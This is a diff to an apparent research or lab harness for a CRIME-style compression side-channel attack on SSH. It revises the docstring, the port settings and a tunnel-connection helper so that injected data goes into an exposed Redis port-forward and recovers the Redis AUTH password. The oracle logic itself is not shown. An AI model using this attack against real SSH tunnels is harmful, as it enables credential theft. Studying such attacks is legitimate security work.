@@ -1,17 +1,17 @@
 """CRIME-style chosen-payload attack against SSH compression.
 
-Realistic port-forward variant
-------------------------------
-The victim tunnels Redis (credentials) and an internal web server (cat
-pictures) through one compressed SSH connection.  The web tunnel's local
-port is bound to 0.0.0.0 and therefore reachable from the attacker's
-network.
+Port-forward variant
+--------------------
+The victim tunnels a Redis server through a compressed SSH connection.
+The tunnel is bound to ``0.0.0.0`` and therefore reachable from the
+attacker's network.  The victim's application authenticates to Redis
+with ``AUTH default <password>`` through the same tunnel.
 
 The attacker injects data by opening TCP connections to the victim's
-web tunnel port.  Data sent on those connections enters the SSH tunnel
+Redis tunnel port.  Data sent on those connections enters the SSH tunnel
 as ``direct-tcpip`` channel data in the **client-to-server** direction,
-sharing the zlib compression context with the victim's Redis
-traffic on the other tunnel.
+sharing the zlib compression context with the victim's Redis AUTH
+traffic.
 
 Repeat-until-confident strategy
 -------------------------------
@@ -44,7 +44,7 @@ LOG = logging.getLogger("attack")
 
 CLIENT_BASE = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
 CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
-WEB_TUNNEL_PORT = int(os.environ.get("WEB_TUNNEL_PORT", "8080"))
+TUNNEL_PORT = int(os.environ.get("TUNNEL_PORT", "6379"))
 LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))
 
 
@@ -61,10 +61,10 @@ def _c2s_total(records: list[dict[str, Any]]) -> int:
 
 
 async def _open_tunnel(retries: int = 20, delay: float = 1.0):
-    """Open a TCP connection to the client's web tunnel."""
+    """Open a TCP connection to the client's exposed tunnel."""
     for attempt in range(1, retries + 1):
         try:
-            return await asyncio.open_connection(CLIENT_HOST, WEB_TUNNEL_PORT)
+            return await asyncio.open_connection(CLIENT_HOST, TUNNEL_PORT)
         except (OSError, ConnectionRefusedError) as exc:
             if attempt < retries:
                 LOG.warning("tunnel connect attempt %d: %s", attempt, exc)
